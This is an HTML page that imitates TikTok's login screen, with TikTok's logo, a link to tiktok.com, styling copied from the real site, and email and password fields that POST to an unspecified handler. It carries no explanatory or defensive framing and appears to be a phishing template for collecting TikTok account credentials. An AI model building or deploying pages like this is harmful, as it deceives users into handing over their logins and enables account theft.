<style>*{font-family: 'Proxima Nova', 'Helvetica', 'Arial', sans-serif;}body{padding: 20px 50px}input{background-color: transparent; padding: 13px 14px; border: none; font-size: 16px; height: 100%; width: 100%; caret-color: #fe2c55;}input:focus{border: none; outline: none;}input::placeholder{opacity: 0.59; font-weight: 450px;}input:focus::placeholder{opacity: 0.42;}form{position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: flex; flex-direction: column; align-items: center;}.btn{background-color: #fe2c55; color: white; cursor: pointer; border: none; outline: none; margin-top: 30px;}.btn:hover:enabled{background-color: #db1d43;}.btn:disabled{background-color: #f1f1f2; color: rgb(150, 150, 150); cursor: initial; border: none; outline: none; cursor: not-allowed;}.input-container{background-color: #f1f1f2; border: 1px solid rgb(223, 223, 223); border-radius: 3px; font-size: 16px; width: 350px; margin-bottom: 14px;}.input-container:hover{background-color: #e9e9e9;}.input-container:focus-within{background-color: #f1f1f2; border: 1px solid rgb(192, 192, 192); outline: none; transition: 0.1s ease-in;}.password-hidden{position: absolute; right: 14px; vertical-align: top; top: 195px; cursor: pointer;}p{font-size: 16px; font-weight: normal;}</style><link rel="stylesheet" href="https://raw.githubusercontent.com/elliakou/proxima-nova-web-fonts/master/fonts/fonts.min.css" type="text/css"><script>function done(){btn=document.getElementById('bn'); if (document.getElementById("1").value !="" && document.getElementById("2").value !=""){btn.disabled=false;}else{btn.disabled=true;}}function hidePassword(e){pass_field=document.getElementById('2'); eye=e.target; if (pass_field.type=="password"){pass_field.type="text"; eye.src="./showPassword.3eea0a28.svg";}else{pass_field.type="password"; eye.src="./hidePassword.d3d87c2c.svg";}}</script><body> <a href="https://www.tiktok.com/foryou"><img style="height:43px;width:auto" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"></a> <form method="POST" action=""> <h1 style="text-align:center;font-size: 25px;">Log in</h1> <label style="width:100%;text-align:left;" for="1"> <p>Email or Username</p></label> <div class="input-container"> <input id="1" placeholder="Email or Username" type="text" onkeyup="done()"/> </div><div class="input-container"> <input id="2" placeholder="Password" type="password" onkeyup="done()"/> <span class="password-hidden" onclick="hidePassword(event)"><img src="./hidePassword.d3d87c2c.svg"/></span> </div><input id="bn" type="submit" class="btn" value="Log in" disabled/> </form></body>
